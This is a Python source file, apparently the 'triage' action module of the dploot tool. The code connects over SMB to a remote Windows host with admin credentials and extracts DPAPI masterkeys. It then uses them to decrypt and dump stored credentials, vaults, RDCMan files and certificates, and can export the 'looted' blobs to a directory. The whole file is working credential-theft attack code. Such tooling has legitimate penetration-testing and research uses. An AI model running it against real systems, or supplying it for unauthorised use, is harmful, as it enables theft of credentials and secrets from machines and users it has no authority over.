import argparse
import logging
import os
import sys
from typing import Callable, Tuple
from dploot.action.masterkeys import add_masterkeys_argument_group, parse_masterkeys_options

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option, parse_file_as_list
from dploot.triage.browser import BrowserTriage
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage
from dploot.triage.rdg import RDGTriage
from dploot.triage.vaults import VaultsTriage

NAME = 'triage'

class TriageAction:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target(options)
        
        self.conn = None
        self._is_admin = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_triage)
        if self.outputdir is not None:
            for tmp in ['certificates', 'credentials', 'rdg', 'vaults', 'masterkeys', 'browser']:
                os.makedirs(os.path.join(self.outputdir, tmp), 0o744, exist_ok=True)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_file_as_list(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        self.conn.connect()

    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        
        if self.is_admin:
            if self.masterkeys is None:
                masterkeys_triage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
                masterkeys_triage.triage_masterkeys()
                self.masterkeys = masterkeys_triage.masterkeys
                for masterkey in self.masterkeys:
                    print(masterkey)
                print()
                if self.outputdir is not None:
                    for filename, bytes in masterkeys_triage.looted_files.items():
                        with open(os.path.join(self.outputdir, 'masterkeys', filename),'wb') as outputfile:
                            outputfile.write(bytes)

            credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            credentials_triage.triage_credentials()
            if self.outputdir is not None:
                for filename, bytes in credentials_triage.looted_files.items():
                    with open(os.path.join(self.outputdir,'credentials', filename),'wb') as outputfile:
                        outputfile.write(bytes)

            vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            vaults_triage.triage_vaults()
            if self.outputdir is not None:
                for filename, bytes in vaults_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, 'vaults', filename),'wb') as outputfile:
                        outputfile.write(bytes)

            rdg_triage = RDGTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            rdg_triage.triage_rdcman()
            if self.outputdir is not None:
                for filename, bytes in rdg_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, 'rdg', filename),'wb') as outputfile:
                        outputfile.write(bytes)

            certificates_triage = CertificatesTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            certificates_triage.triage_certificates()
            if self.outputdir is not None:
                for filename, bytes in certificates_triage.looted_files.items():
                    with open(os.path.join(self.outputdir,'certificates', filename),'wb') as outputfile:
                        outputfile.write(bytes)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = TriageAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from remote target")

    group = subparser.add_argument_group("triage options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-export-triage",
        action="store",
        metavar="DIR_TRIAGE",
        help=(
            "Dump looted blob to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry